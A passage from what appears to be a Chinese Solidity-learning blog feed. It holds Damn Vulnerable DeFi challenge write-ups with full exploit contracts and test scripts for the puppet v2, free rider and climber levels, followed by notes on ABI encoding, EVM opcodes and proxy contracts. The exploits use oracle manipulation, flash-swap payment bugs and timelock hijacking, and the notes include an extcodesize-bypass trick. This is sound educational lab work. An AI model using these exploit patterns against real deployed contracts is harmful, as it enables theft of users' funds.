(uint amountOut)&#123;        require(amountIn &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#39;);        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#39;);        uint amountInWithFee = amountIn*(997);        uint numerator = amountInWithFee*(reserveOut);        uint denominator = reserveIn*(1000)+(amountInWithFee);        amountOut = numerator / denominator;    &#125;//这个是粘贴uniswapLibrary里的计算方法 给出输入 计算输出    function uniswapV2Call(address target,uint256 amount0,uint256 amount1,bytes calldata data) external&#123;        (bool success,) = token.call(data);        require(success,&quot;call failed&quot;);    &#125;    receive() external payable&#123;&#125;&#125;   it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const ATTACKER_TOKEN_TO_SWAP = ethers.utils.parseEther(&#39;9999&#39;);    const value = ethers.utils.parseEther(&#39;19.9&#39;);    await this.weth.connect(attacker).deposit(&#123;value:  value&#125;);    const AttackContractFactory = await ethers.getContractFactory(&quot;puppetv2Attack&quot;,attacker);    this.AttackContract = await AttackContractFactory.deploy(this.uniswapExchange.address,this.token.address,this.weth.address);    //计算数据 部署合约准备    await this.token.connect(attacker).transfer(this.AttackContract.address,ATTACKER_TOKEN_TO_SWAP);    const amountOut = await this.AttackContract.getAmountOut(ATTACKER_TOKEN_TO_SWAP,UNISWAP_INITIAL_TOKEN_RESERVE,UNISWAP_INITIAL_WETH_RESERVE);    //计算输出    const data = web3.eth.abi.encodeFunctionCall(&#123;        name: &#39;transfer&#39;,        type: &#39;function&#39;,        inputs:[&#123;            type: &#39;address&#39;,            name: &#39;add&#39;        &#125;,&#123;            type: &#39;uint256&#39;,            name: &#39;amount&#39;        &#125;]    &#125;,[this.uniswapExchange.address,ATTACKER_TOKEN_TO_SWAP]);    await this.uniswapExchange.connect(attacker).swap(0,amountOut,this.AttackContract.address,data)    //进行交换    const amount1 = await this.weth.balanceOf(this.AttackContract.address);    const data2 = web3.eth.abi.encodeFunctionCall(&#123;        name: &#39;transfer&#39;,        type: &#39;function&#39;,        inputs:[&#123;            type: &#39;address&#39;,            name: &#39;add&#39;        &#125;,&#123;            type: &#39;uint256&#39;,            name: &#39;amount&#39;        &#125;]    &#125;,[attacker.address,amount1]);    await this.AttackContract.giveToken(data2);    //把换出来的weth转给attacker    const amountRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);    //计算borrow所需weth    await this.weth.connect(attacker).approve(this.lendingPool.address,amountRequired);    console.log(amountRequired);    console.log(await this.weth.balanceOf(attacker.address));    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);    //进行borrow&#125;);</code></pre><h2 id="free-rider"><a href="#free-rider" class="headerlink" title="free rider"></a>free rider</h2><p>有一个NFT 的新市场 最初的铸币量为 6 个 NFT，可在市场上出售。每个 15 ETH<br>开发人员得知市场可以被攻击 取走所有nft 所以他们悬赏45ETH，给任何愿意将 NFT 取出并将它们发送到他们的方式的人。<br>攻击者从0.1eth开始，拿走所有赏金<br>让我们先看看市场的漏洞在哪里  </p><pre><code>function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;    for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;        _buyOne(tokenIds[i]);    &#125;&#125;function _buyOne(uint256 tokenId) private &#123;           uint256 priceToPay = offers[tokenId];    require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);    require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);    amountOfOffers--;    // transfer from seller to buyer    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);    // pay seller    payable(token.ownerOf(tokenId)).sendValue(priceToPay);    emit NFTBought(msg.sender, tokenId, priceToPay);&#125;    </code></pre><p>可以看到在买入的时候先用safeTransferFrom将nft发给买家，再把priceToPay给货币主人  但是这时候货币主人已经是买家，相当于又把买入的钱发给了买家 买家没有花一分钱就得到了nft<br>还有一个是我们的buyMany是一次事务 在这次事务执行中buyOne每次的msg.value是不变的  所以我们如果要买多个nft 只需要传入一个nft的钱就可以  </p><p>那么我们如何获得通过require(msg.value &gt;= priceToPay, “Amount paid is not enough”)验证的初始资金  </p><p>看题目测试过程 创建了uniswapV2 token0，token1分别是weth和DamnVulnerableToken  其中的swap方法可以让我们先获得代币，经过操作后再归还，所以我们只需要通过swap借出购买一个nft的钱够买完毕后再归还就可以<br>最后再把nft都转给悬赏合约 悬赏合约就会发钱给攻击者<br>    // SPDX-License-Identifier: MIT<br>    import ‘./FreeRiderBuyer.sol’;<br>    import ‘./FreeRiderNFTMarketplace.sol’;<br>    import ‘../WETH9.sol’;<br>    import ‘../DamnValuableToken.sol’;<br>    import “@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol”;<br>    interface NFTtransfer{<br>        function safeTransferFrom(<br>            address from,<br>            address to,<br>            uint256 tokenId<br>        ) external ;<br>    }</p><pre><code>pragma solidity ^0.8.0;contract freeriderAttack&#123;    FreeRiderNFTMarketplace market;    address pair;    WETH9 WETH;    FreeRiderBuyer buy;    address payable NFT;    DamnValuableToken Token;    address attacker;    constructor(address _market,address _pair,address _WETH,address _buy,address _NFT,address payable _token,address attack) public payable&#123;        market = FreeRiderNFTMarketplace(payable(_market));        pair = _pair;        WETH = WETH9(payable(_WETH));        buy = FreeRiderBuyer(_buy);        NFT = payable(_NFT);        Token = DamnValuableToken(_token);        attacker = attack;    &#125;    function attack(uint256 amount) public payable&#123;        for(uint i = 0;i&lt;6;i++)&#123;            NFTtransfer(NFT).safeTransferFrom(address(this),address(buy),i);        &#125;    &#125;    function uniswapV2Call(address from, uint amount1,uint amount2,bytes memory data) external&#123;        WETH.withdraw(amount1);        uint[] memory tokenId = new uint[](6);        for(uint i = 0;i &lt; 6; i++)&#123;            tokenId[i] = i;        &#125;        market.buyMany&#123;value: amount1&#125;(tokenId);        WETH.deposit&#123;value:address(this).balance&#125;();        uint amount = WETH.balanceOf(address(this));        WETH.transfer(address(pair),amount);    &#125;    receive() external payable&#123;&#125;    function onERC721Received(        address add1,        address add2,        uint256 _tokenId,        bytes memory    )public returns (bytes4) &#123;        return IERC721Receiver.onERC721Received.selector;    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    this.attackContract = await (await ethers.getContractFactory(&#39;freeriderAttack&#39;, attacker)).deploy(        this.marketplace.address,        this.uniswapPair.address,        this.weth.address,        this.buyerContract.address,        this.nft.address,        this.token.address,        attacker.address    );    const data = &quot;0x123456&quot;;//data不能是0    await this.uniswapPair.connect(attacker).swap(NFT_PRICE,0,this.attackContract.address,data);    console.log(await this.nft.ownerOf(0));    console.log(this.attackContract.address);    await this.attackContract.connect(attacker).attack(NFT_PRICE);&#125;);</code></pre><h2 id="climber"><a href="#climber" class="headerlink" title="climber"></a>climber</h2><p>有一个安全的金库合同保护着10万个DVT代币。保管库可按照 UUPS 模式进行升级。<br>金库的所有者，目前是一个时间锁合约，每15天可以提取非常有限数量的代币。<br>在金库上，还有一个额外的角色，有权在紧急情况下扫描所有代币。<br>在时间锁上，只有具有“提议者”角色的帐户才能计划可在 1 小时后执行的操作。<br>要通过此挑战，请从保管库中获取所有令牌。  </p><p>观察金库 要想取走所有货币，一次一次取是不现实的 因为有WAITING_PERIOD和WITHDRAWAL_LIMIT<br>可以看到有一个函数sweepFunds可以一次取走所有token 预计我们要通过这个函数完成题目<br>这个函数只有sweeper可以调用  </p><p>观察时间锁 它可以向给定的target发送事务，需先准备，经过延迟才可以执行，并且只有PROPOSER_ROLE可以进行事务准备  </p><pre><code>for (uint8 i = 0; i &lt; targets.length; i++) &#123;        targets[i].functionCallWithValue(dataElements[i], values[i]);    &#125;require(getOperationState(id) == OperationState.ReadyForExecution);</code></pre><p>可以看到在事务执行过程先进行调用再进行验证，这是不合理的<br>因为我们可以通过改变合约内的一些状态来通过验证  </p><p>金库是一个UUPS代理合约而时间锁是它的owner<br>所以我们可以通过时间锁向金库发送事务，更新它的逻辑合约<br>    function upgradeTo(address newImplementation) external virtual onlyProxy {<br>            _authorizeUpgrade(newImplementation);<br>            _upgradeToAndCallSecure(newImplementation, new bytes(0), false);<br>        }<br>由于用的是_upgradeToAndCallSecure(newImplementation, new bytes(0), false);<br>所有必须保证新逻辑合约也是UUPS标准<br>由此可以想到，如果我们对新逻辑合约的sweepFunds进行一些调整 把修饰符去掉 sweep改为msg.sender这样任何人都可以调用sweepFunds，就可以完成题目<br>    function sweepFunds(address tokenAddress) external {<br>        IERC20 token = IERC20(tokenAddress);<br>        require(token.transfer(msg.sender, token.balanceOf(address(this))), “Transfer failed”);<br>    }</p><p>所以，第一步 把延迟时间改为0<br>      第二步 把自己setRole从而可以进行事务准备<br>      第三步 更新逻辑合约<br>      第四步 进行事务准备<br>然后，我们就可以调用更新后的sweepFunds完成题目</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberTimelock.sol&quot;;interface setRole&#123;function grantRole(bytes32 role, address account) external;&#125;interface upgrate&#123;    function upgradeTo(address newImplementation) external;&#125;contract ClimberAttack&#123;    ClimberTimelock timelock;    address vault;    bytes32 public constant PROPOSER_ROLE = keccak256(&quot;PROPOSER_ROLE&quot;);    constructor(address payable lock,address _vault) public&#123;        timelock = ClimberTimelock(lock);        vault = _vault;    &#125;    function attack(address newIm) public&#123;        address[] memory target = new address[](4);        uint256[] memory values = new uint256[](4);        bytes[] memory dataElements = new bytes[](4);        bytes32 salt;        target[0] = address(timelock);        target[1] = address(timelock);        target[3] = address(timelock);        target[2] = vault;        for(uint i = 0; i &lt; 4; i++)&#123;            values[i] = 0;        &#125;        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector , 0);        dataElements[1] = abi.encodeWithSelector(setRole.grantRole.selector,keccak256(&quot;PROPOSER_ROLE&quot;),address(this));        dataElements[2] = abi.encodeWithSelector(upgrate.upgradeTo.selector, newIm);        dataElements[3] = abi.encodeWithSelector(ClimberTimelock.schedule.selector, target,values,dataElements,salt);        timelock.execute(target, values, dataElements, salt);    &#125;&#125;</code></pre><p>测试</p><pre><code>    it(&#39;Exploit&#39;, async function () &#123;            /** CODE YOUR EXPLOIT HERE */    this.AttackContract = await (await ethers.getContractFactory(&#39;ClimberAttack&#39;,attacker)).deploy(this.timelock.address,this.vault.address)    this.newIM = await (await ethers.getContractFactory(&#39;newClimberVault&#39;,attacker)).deploy();    this.AttackContract.attack(this.newIM.address);    this.vault.connect(attacker).sweepFunds(this.token.address);&#125;);</code></pre>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>argument encoding</title>
      <link href="/2022/11/26/Argument-Encoding/"/>
      <url>/2022/11/26/Argument-Encoding/</url>
      
        <content type="html"><![CDATA[<h1 id="关于函数选择器中的argument-encodeing"><a href="#关于函数选择器中的argument-encodeing" class="headerlink" title="关于函数选择器中的argument encodeing"></a>关于函数选择器中的argument encodeing</h1><p><strong>规则</strong><br>先将函数参数按顺序储存，如果是定长数据类型，直接储存其data，如果是变长数据类型，先储存其offset<br>    <em>对于第一个变长数据</em>：offset = 0x20<em>num（num为函数参数的个数）    </em>对于其后的变长数据<em>：offset = offset——pre + 0x20</em>num（offset——pre为上一个变长数据储存占用的大小，num为上一个变长数据元素的个数）<br>储存完offset 接着储存length和data</p><p>例如</p><pre><code>function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter/*data of first parameter: uint定长类型，直接存储其dataoffset of second parameter: uint32[]动态数组，先存储其offset=0x20*4 (4代表函数参数的个数) data of third parameter: bytes10定长类型，直接存储其dataoffset of forth parameter: bytes变长类型，先存储其offset=0x80+0x20*3=0xe0 (0x80是前一个变长类型的offset，3是前一个变长类型存储其长度和两个元素占用的插槽个数)length of second parameter: 存储完data或者offset后，便开始存储变长数据的length和data，这里是第二个参数的长度first data of second parameter: 第二个参数的第一个数据second data of second parameter: 第二个参数的第二个数据length of forth parameter: 上面就把第二个变长数据存储完成，这里就是存储下一个变长数据的长度data of forth parameter: 第四个参数的数据*/</code></pre><p>对于较复杂的结构  可以由内向外拆分</p><pre><code>struct Test &#123;        string name;        string policies;        uint num;    &#125;function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;设结构体数组有两个结构体第一个结构体内*注：结构体内部编码形式可以看作一个函数offset of name1offset of policies1data of num1length of name1ecoding of name1length of policies1ecoding of policies1对于第二个结构体内offset of name2offset of policies2data of num2length of name2ecoding of name2length of policies2ecoding of policies2</code></pre><p><em>由于是结构体</em><br>还需要</p><pre><code>offset of [name1, policies1,num1]offset of [name2, policies2,num2]</code></pre><p>由于是结构体数组<br>还需要</p><pre><code>offset of[name1, policies1,num1][name2,policies2,num2]count of it</code></pre><p>因此 结果为</p><pre><code>data of first parameteroffset of[name1, policies1,num1][name2,policies2,num2]count of itoffset of name1offset of policies1data of num1length of name1ecoding of name1length of policies1ecoding of policies1offset of name2offset of policies2data of num2length of name2ecoding of name2length of policies2ecoding of policies2</code></pre><p>源文章：<a href="https://hitcxy.com/2021/argument-encoding/">https://hitcxy.com/2021/argument-encoding/</a></p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识点</title>
      <link href="/2022/11/26/knowledge/"/>
      <url>/2022/11/26/knowledge/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><hr><h2 id="合同间的调用函数"><a href="#合同间的调用函数" class="headerlink" title="合同间的调用函数"></a>合同间的调用函数</h2><h3 id="call-delegatecall-callcode区别"><a href="#call-delegatecall-callcode区别" class="headerlink" title="call||delegatecall||callcode区别"></a>call||delegatecall||callcode区别</h3><p><strong>call</strong>：调用后内置变量msg的值会修改为调用者 执行环境为<em>被调用者</em>的环境<br>A调B B委托调C 此时msg.sender为B<br><strong>地址.call{value：}（bytes（keccak256（函数标识符）））</strong></p><p><strong>delegatecall</strong>： 调用后内置变量msg的值<em>不会</em>改为调用者 执行环境为<em>调用者</em> 的运行环境<br>如A调B B委托调用C 此时msg.sender为A</p><p><strong>callcode</strong>： 调用后内置变量msg的值会改为调用者，但执行环境为<em>调用者</em>的运行环境</p><hr><h2 id="通过selfdestruct发送ETH到不可接收合约"><a href="#通过selfdestruct发送ETH到不可接收合约" class="headerlink" title="通过selfdestruct发送ETH到不可接收合约"></a>通过selfdestruct发送ETH到不可接收合约</h2><p>合约自毁，把合约剩余balancs转到指定地址 不管有没有payable<br>selfdestruct(payable(address))</p><hr><h2 id="msg-sender-与tx-origin"><a href="#msg-sender-与tx-origin" class="headerlink" title="msg.sender 与tx.origin"></a>msg.sender 与tx.origin</h2><p> msg.sender为函数直接调用方  tx.origin是交易原始发起方<br> 如用户通过合约A调用合约B<br> 对于合约A tx.origin和msg.sender均为用户<br> 对于合约B tx.origin为用户 msg.sender为合约A</p><hr><p>private属性的数据在可以通过外部访问<br>web3.eth.getStorageAt（’合约地址’，序号）；</p><hr><p> extcodesize（地址）<br> 用来检查是用户地址还是合约地址<br> 如果extcodesize为0 则为用户地址</p><p> 隐患  当合约未创建时 代码长度检测为零 所以如果把攻击函数写在构造函数中，就可以绕过认证</p><hr><p>bytes uint 转换<br>bytes8 bytes32都是定长字节组 他们转换为16进制储存 位数为16 ，64… （一个字节（十六进制）两位）<br>bytes8转换可转换为uint64  bytes32 转换为uint256</p><hr><h1 id="solidity中的内联汇编"><a href="#solidity中的内联汇编" class="headerlink" title="solidity中的内联汇编"></a>solidity中的内联汇编</h1><p>汇编：可用汇编器转换为机器代码的低级编程语言。<br>操作码：为了解决实际问题，基于栈结构机器需要实现一些额外的指令，执行指令时先从堆栈弹出一个或多个值作为参数，再将执行结果压回堆栈</p><h2 id="为什么solidity要使用汇编？"><a href="#为什么solidity要使用汇编？" class="headerlink" title="为什么solidity要使用汇编？"></a>为什么solidity要使用汇编？</h2><p>1.可以直接用操作码与EVM交互 对操作进行更加精准的操控<br>2.更少的gas消耗<br>3.更强的功能</p><h2 id="solidity中两种类型的汇编："><a href="#solidity中两种类型的汇编：" class="headerlink" title="solidity中两种类型的汇编："></a>solidity中两种类型的汇编：</h2><p>1.内联汇编2.独立汇编</p><h2 id="基本汇编语法"><a href="#基本汇编语法" class="headerlink" title="基本汇编语法"></a>基本汇编语法</h2><p><strong>引入汇编</strong><br>assembly{</p><p>}<br><em>用assembly嵌入汇编代码块</em><br><strong>注</strong>：汇编代码块之间不能通信 一个代码块里的的变量，在另一个汇编语言中不可以访问<br>例子：</p><pre><code>function addition（uint x, uint y）public pure returns(uint)&#123;    assemble&#123;        //创建一个变量result        //-&gt;使用add操作码计算x+y        //-&gt;将计算结果赋值给result        let result := add(x,y) //x+y        //使用mstore操作码        // -&gt; result变量的值存入内存        // -&gt; 指定内存地址0x0        mstore(0x0,result)        //结果存入内存        //从内存地址返回0x返回32字节        return(0x0, 32)        &#125;&#125;</code></pre><h2 id="solidity汇编中变量的定义与赋值"><a href="#solidity汇编中变量的定义与赋值" class="headerlink" title="solidity汇编中变量的定义与赋值"></a>solidity汇编中变量的定义与赋值</h2><p>let关键字定义<br>：=赋值<br>assembly{<br>    let x ：= 2<br>}<br>如不赋值初始化为0；</p><p><em>let运行机制</em><br>创建一个新的堆栈槽位<br>为变量保持槽位<br>代码块结束自动销毁该槽位</p><h4 id="汇编的注释"><a href="#汇编的注释" class="headerlink" title="汇编的注释"></a>汇编的注释</h4><p>//<br>/<em> </em>/</p><h4 id="块与作用域"><a href="#块与作用域" class="headerlink" title="块与作用域"></a>块与作用域</h4><p>一个块的范围使用一对大括号标识</p><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><p>assembly{</p><pre><code>for&#123; let i := 0 &#125;//初始化 lt(i,n)//执行条件 &#123; i := add(i,1) &#125;&#123;    value := mul(2, value)&#125;mstore(0x0, value)return(0x0, 32)</code></pre><p>}</p><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>assemble {<br>    let x := 0;<br>    let i := 0;<br>    for {} lt(i,0x100){ }{<br>        x:=add(x,mload(i))<br>        i:=add(i,0x20)<br>    }<br>}</p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>assemble{<br>    if slt(x,0) { x := sub( 0, x) }<br>    if eq{value, 0} revert(0,0)<br>    //无else<br>}</p><h2 id="汇编的函数"><a href="#汇编的函数" class="headerlink" title="汇编的函数"></a>汇编的函数</h2><h2 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h2><p>stop()    -                                                F    stop execution, identical to return(0, 0)<br>add(x, y)                                                 F    x + y<br>sub(x, y)                                                 F    x - y<br>mul(x, y)                                                 F    x <em> y<br>div(x, y)                                                 F    x / y or 0 if y == 0<br>sdiv(x, y)                                                 F    x / y, for signed numbers in two’s complement, 0 if y == 0<br>mod(x, y)                                                 F    x % y, 0 if y == 0<br>smod(x, y)                                                 F    x % y, for signed numbers in two’s complement, 0 if y == 0<br>exp(x, y)                                                 F    x to the power of y<br>not(x)                                                     F    bitwise “not” of x (every bit of x is negated)<br>lt(x, y)                                                 F    1 if x &lt; y, 0 otherwise<br>gt(x, y)                                                 F    1 if x &gt; y, 0 otherwise<br>slt(x, y)                                                 F    1 if x &lt; y, 0 otherwise, for signed numbers in two’s complement<br>sgt(x, y)                                                 F    1 if x &gt; y, 0 otherwise, for signed numbers in two’s complement<br>eq(x, y)                                                 F    1 if x == y, 0 otherwise<br>iszero(x)                                                 F    1 if x == 0, 0 otherwise<br>and(x, y)                                                 F    bitwise “and” of x and y<br>or(x, y)                                                 F    bitwise “or” of x and y<br>xor(x, y)                                                 F    bitwise “xor” of x and y<br>byte(n, x)                                                 F    nth byte of x, where the most significant byte is the 0th byte<br>shl(x, y)                                                 C    logical shift left y by x bits<br>shr(x, y)                                                 C    logical shift right y by x bits<br>sar(x, y)                                                 C    signed arithmetic shift right y by x bits<br>addmod(x, y, m)                                             F    (x + y) % m with arbitrary precision arithmetic, 0 if m == 0<br>mulmod(x, y, m)                                             F    (x </em> y) % m with arbitrary precision arithmetic, 0 if m == 0<br>signextend(i, x)                                         F    sign extend from (i*8+7)th bit counting from least significant<br>keccak256(p, n)                                             F    keccak(mem[p…(p+n)))<br>pc()                                                     F    current position in code<br>pop(x)    -                                                F    discard value x<br>mload(p)                                                 F    mem[p…(p+32))<br>mstore(p, v)    -                                        F    mem[p…(p+32)) := v<br>mstore8(p, v)    -                                        F    mem[p] := v &amp; 0xff (only modifies a single byte)<br>sload(p)                                                 F    storage[p]<br>sstore(p, v)    -                                        F    storage[p] := v<br>msize()                                                     F    size of memory, i.e. largest accessed memory index<br>gas()                                                     F    gas still available to execution<br>address()                                                 F    address of the current contract / execution context<br>balance(a)                                                 F    wei balance at address a<br>selfbalance()                                             I    equivalent to balance(address()), but cheaper<br>caller()                                                 F    call sender (excluding delegatecall)<br>callvalue()                                                 F    wei sent together with the current call<br>calldataload(p)                                             F    call data starting from position p (32 bytes)<br>calldatasize()                                             F    size of call data in bytes<br>calldatacopy(t, f, s)                                    F    copy s bytes from calldata at position f to mem at position t<br>codesize()                                                 F    size of the code of the current contract / execution context<br>codecopy(t, f, s)    -                                    F    copy s bytes from code at position f to mem at position t<br>extcodesize(a)                                             F    size of the code at address a<br>extcodecopy(a, t, f, s)    -                                F    like codecopy(t, f, s) but take code at address a<br>returndatasize()                                         B    size of the last returndata<br>returndatacopy(t, f, s)    -                                B    copy s bytes from returndata at position f to mem at position t<br>extcodehash(a)                                             C    code hash of address a<br>create(v, p, n)                                             F    create new contract with code mem[p…(p+n)) and send v wei and return the new address<br>create2(v, p, n, s)                                         C    create new contract with code mem[p…(p+n)) at address keccak256(0xff . this . s . keccak256(mem[p…(p+n))) and send v wei and         return the new address, where 0xff is a 1 byte value, this is the current contract’s address as a 20 byte value and s is a big-endian 256-bit value<br>call(g, a, v, in, insize, out, outsize)                     F    call contract at address a with input mem[in…(in+insize)) providing g gas and v wei and output area mem[out…(out+outsize)) returning 0 on error (eg. out of gas) and 1 on success<br>callcode(g, a, v, in, insize, out, outsize)                 F    identical to call but only use the code from a and stay in the context of the current contract otherwise<br>delegatecall(g, a, in, insize, out, outsize)             H    identical to callcode but also keep caller and callvalue<br>staticcall(g, a, in, insize, out, outsize)                 B    identical to call(g, a, 0, in, insize, out, outsize) but do not allow state modifications<br>return(p, s)    -                                        F    end execution, return data mem[p…(p+s))<br>revert(p, s)    -                                        B    end execution, revert state changes, return data mem[p…(p+s))<br>selfdestruct(a)    -                                        F    end execution, destroy current contract and send funds to a<br>invalid()    -                                            F    end execution with invalid instruction<br>log0(p, s)    -                                            F    log without topics and data mem[p…(p+s))<br>log1(p, s, t1)    -                                        F    log with topic t1 and data mem[p…(p+s))<br>log2(p, s, t1, t2)    -                                    F    log with topics t1, t2 and data mem[p…(p+s))<br>log3(p, s, t1, t2, t3)    -                                F    log with topics t1, t2, t3 and data mem[p…(p+s))<br>log4(p, s, t1, t2, t3, t4)    -                            F    log with topics t1, t2, t3, t4 and data mem[p…(p+s))<br>chainid()                                                 I    ID of the executing chain (EIP 1344)<br>origin()                                                 F    transaction sender<br>gasprice()                                                 F    gas price of the transaction<br>blockhash(b)                                             F    hash of block nr b - only for last 256 blocks excluding current<br>coinbase()                                                 F    current mining beneficiary<br>timestamp()                                                 F    timestamp of the current block in seconds since the epoch<br>number()                                                 F    current block number<br>difficulty()                                             F    difficulty of the current block<br>gaslimit()                                                 F    block gas limit of the current block</p><hr><p>delegatecall 调用其他合约函数 如果改变变量 改变的其实是调用合约 相应插槽的值 而不是被调用合约的值</p><hr><p>Storage</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxy</title>
      <link href="/2022/11/26/proxy/"/>
      <url>/2022/11/26/proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h1><hr><p>代理将数据和逻辑分开，分别保存在不同合约中，代理合约和逻辑合约</p><p>对外暴露的是代理合约的地址，用户在进行交互是实际在于代理合约交互，代理合约把数据传给逻辑合约，逻辑合约执行后返回给代理合约，代理合约进一步返回给用户。<br>此方式可以对逻辑合约进行升级，只需把代理合约指向的目标合约进行替换。</p><p>代理合约的实现需要solidity内联汇编，开发者需要熟悉每个步骤的含义<br>代理合约如何实现逻辑合约的函数调用？<br>主要是回调函数，当调用合约中不存在的函数会触发合约中的回调函数，回调函数中将calldata储存并用delegatecall调用目标合约<br>比如</p><pre><code>fallback() external payable &#123;address _implementation = implementation;    assembly &#123;        // 将msg.data拷贝到内存里        // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度        calldatacopy(0, 0, calldatasize())        // 利用delegatecall调用implementation合约        // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度        // output area起始位置和长度位置，所以设为0        // delegatecall成功返回1，失败返回0        let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)        // 将return data拷贝到内存        // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度        returndatacopy(0, 0, returndatasize())        switch result        // 如果delegate call失败，revert        case 0 &#123;            revert(0, returndatasize())        &#125;        // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes）        default &#123;            return(0, returndatasize())        &#125;    &#125;&#125;</code></pre><hr><h2 id="openzepplin代理-核心"><a href="#openzepplin代理-核心" class="headerlink" title="openzepplin代理 核心"></a>openzepplin代理 核心</h2><p>1.<strong>proxy</strong><br>此抽象合约提供了一个回退函数，该函数使用 EVM 将所有调用委托给另一个合约指令，第二个合约的实现必须通过覆盖虚拟_implementation函数来指定<br>2.<strong>ERC1967Proxy</strong><br>此协定实现可升级的代理。它是可升级的，因为调用被委托给可以更改的实现地址</p><pre><code>contract ERC1967Proxy is Proxy, ERC1967Upgrade &#123;    constructor(address _logic, bytes memory _data) payable &#123;        _upgradeToAndCall(_logic, _data, false);    &#125;    function _implementation() internal view virtual override returns (address impl) &#123;        return ERC1967Upgrade._getImplementation();    &#125;&#125;</code></pre><p>3.<strong>ERC1967Upgrade</strong><br>整理下其中的函数和事件<br>首先是回调函数：</p><pre><code> function _upgradeBeaconToAndCall(        address newBeacon,        bytes memory data,        bool forceCall    ) internal &#123;        _setBeacon(newBeacon);        emit BeaconUpgraded(newBeacon);        if (data.length &gt; 0 || forceCall) &#123;            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);        &#125;    &#125;&#125;</code></pre><p>它将调用数据传给目标合约<br>三个事件：</p><pre><code>event AdminChanged(address previousAdmin, address newAdmin);//更改管理员时触发event Upgraded(address indexed implementation);//升级时触发event BeaconUpgraded(address indexed beacon)；//升级信标时触发</code></pre><p>获得当前管理：</p><pre><code> function _getAdmin() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;&#125;</code></pre><p>更改管理：</p><pre><code>function _changeAdmin(address newAdmin) internal &#123;    emit AdminChanged(_getAdmin(), newAdmin);    _setAdmin(newAdmin);&#125;function _setAdmin(address newAdmin) private &#123;    require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;);    StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;&#125;</code></pre><p>返回信标：</p><pre><code> function _getBeacon() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_BEACON_SLOT).value;&#125;</code></pre><p>设置一个新信标在EIP1967 beacon solt：</p><pre><code> function _setBeacon(address newBeacon) private &#123;    require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;);    require(        Address.isContract(IBeacon(newBeacon).implementation()),        &quot;ERC1967: beacon implementation is not a contract&quot;    );    StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;&#125;</code></pre><p>获得当前目标地址：</p><pre><code> function _getImplementation() internal view returns (address) &#123;    return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;&#125;</code></pre><p>更新目标地址：</p><pre><code> function _upgradeTo(address newImplementation) internal &#123;    _setImplementation(newImplementation);    emit Upgraded(newImplementation);&#125;function _setImplementation(address newImplementation) private &#123;    require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);    StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;&#125;</code></pre><p>更改并调用：</p><pre><code> function _upgradeToAndCall(    address newImplementation,    bytes memory data,    bool forceCall) internal &#123;    _upgradeTo(newImplementation);    if (data.length &gt; 0 || forceCall) &#123;        Address.functionDelegateCall(newImplementation, data);    &#125;&#125;  function _upgradeToAndCallUUPS(    address newImplementation,    bytes memory data,    bool forceCall) internal &#123;    if 